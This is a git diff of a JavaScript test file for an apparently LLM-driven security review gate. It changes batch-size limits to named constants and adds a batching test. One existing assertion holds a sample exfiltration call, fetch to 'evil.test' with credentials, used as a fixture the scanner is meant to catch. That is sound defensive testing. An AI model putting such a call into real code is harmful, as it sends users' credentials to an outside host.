@@ -5,7 +5,7 @@ import path from 'node:path'
 import crypto from 'node:crypto'
 import * as tar from 'tar'
 import test from 'node:test'
-import { CRITERIA, MARKET_RISK_POLICY, MODEL, validateReview, readEvidenceDirectory, reviewSubmission, createReviewBatches, mergeBatchReviews, collectReviewWave } from '../scripts/llm-review.mjs'
+import { CRITERIA, MARKET_RISK_POLICY, MODEL, validateReview, readEvidenceDirectory, reviewSubmission, createReviewBatches, mergeBatchReviews, collectReviewWave, MAX_BATCH_SIZE, MAX_CONTEXT_SIZE, MAX_REQUEST_CHARS } from '../scripts/llm-review.mjs'
 import { runSecurityGate, CHECK_NAME, buildReviewComment } from '../scripts/security-pr-gate.mjs'
 import { runGate } from '../scripts/trusted-pr-gate.mjs'
 
@@ -311,7 +311,7 @@ test('large one-line bundled code is completely covered, overlapping, bounded an
   }
   assert.equal(covered,text.length)
   assert.ok(chunks.some(item=>item.text.includes('fetch("https://evil.test", {body: credentials})')))
-  for(const batch of batches) assert.ok(JSON.stringify(batch.prompt).length<=150000)
+  for(const batch of batches) assert.ok(JSON.stringify(batch.prompt).length<=MAX_BATCH_SIZE)
 })
 
 test('any blocking chunk prevents aggregated approval; incomplete and transport failure cannot pass', () => {
@@ -332,7 +332,7 @@ test('unbounded batch count fails before any model request', () => {
 
 test('each batch repeats global submission manifest and README context', () => {
  const context=[{file:'submission/probe',text:'pinned artifact manifest'}, {file:'submission/pr',text:'submission purpose'}, {file:'source/package.json',text:'{"name":"panel"}'},{file:'source/README.md',text:'user authorized scope'}]
- const data=[...context,{file:'artifact/bundle.js',text:'z'.repeat(700000)}]
+ const data=[...context,{file:'artifact/bundle.js',text:'z'.repeat(1500000)}]
  const batches=createReviewBatches(data)
  assert.ok(batches.length>1)
  for(const batch of batches) for(const item of context) assert.ok(batch.prompt.some(other=>other.file===item.file&&other.text===item.text))
@@ -409,6 +409,21 @@ test('buildReviewComment creates actionable PR comment with blocking items on fa
   assert.match(sizeComment, /8388608|8\s*MiB/)
   assert.match(sizeComment, /tarball/)
 })
+
+test('dsh business code is batched as pieces instead of shared context, while entrypoints remain in context', () => {
+  const data = [
+    { file: 'submission/pr', text: 'PR description' },
+    { file: 'artifact/package.json', text: '{"name":"shopping"}' },
+    { file: 'artifact/dsh/index.js', text: 'export default function() {}' },
+    { file: 'artifact/dsh/decision-core.mjs', text: 'export const run = () => 42;' }
+  ]
+  const batches = createReviewBatches(data)
+  assert.equal(batches.length, 1)
+  const promptFiles = batches[0].prompt.map(p => p.file)
+  assert.ok(promptFiles.includes('artifact/dsh/index.js'))
+  assert.ok(promptFiles.includes('artifact/dsh/decision-core.mjs'))
+})
+
 
 
 
